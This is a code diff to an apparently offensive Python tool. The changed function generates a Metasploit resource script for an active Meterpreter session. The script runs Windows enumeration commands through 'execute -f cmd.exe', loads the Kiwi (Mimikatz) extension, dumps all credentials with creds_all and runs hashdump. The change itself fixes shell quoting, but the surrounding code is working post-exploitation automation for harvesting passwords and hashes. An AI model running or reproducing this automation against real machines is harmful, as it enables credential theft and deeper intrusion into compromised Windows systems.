@@ -196,17 +196,25 @@ def _build_meterpreter_rc(host: str, session_id: int) -> str:
     """
     Generate a Metasploit resource script that:
       1. Selects the active session
-      2. Runs all Windows enumeration commands via 'shell'
+      2. Runs all Windows enumeration commands via the Meterpreter 'execute' command
       3. Loads Kiwi and dumps all credentials
       4. Runs hashdump
+
+    Uses 'execute -f cmd.exe -a "/c <cmd>" -i' instead of nested shell quoting
+    to avoid double-quote escaping issues with commands like findstr /C:"OS".
     """
-    shell_cmds = "\n".join(
-        f'sessions -i {session_id} -c "shell -c \\"{cmd}\\""'
-        for cmd in WINDOWS_COMMANDS
-    )
+    shell_cmds = []
+    for cmd in WINDOWS_COMMANDS:
+        # Use single quotes around the -c argument to avoid conflicts with
+        # double quotes inside Windows commands (e.g. findstr /C:"OS")
+        escaped = cmd.replace("'", "'\\''")
+        shell_cmds.append(
+            f"sessions -i {session_id} -c 'execute -f cmd.exe -a \"/c {escaped}\" -H -i'"
+        )
+    shell_block = "\n".join(shell_cmds)
     rc = textwrap.dedent(f"""\
         sessions -i {session_id}
-        {shell_cmds}
+        {shell_block}
         sessions -i {session_id} -c "load kiwi"
         sessions -i {session_id} -c "creds_all"
         sessions -i {session_id} -c "hashdump"
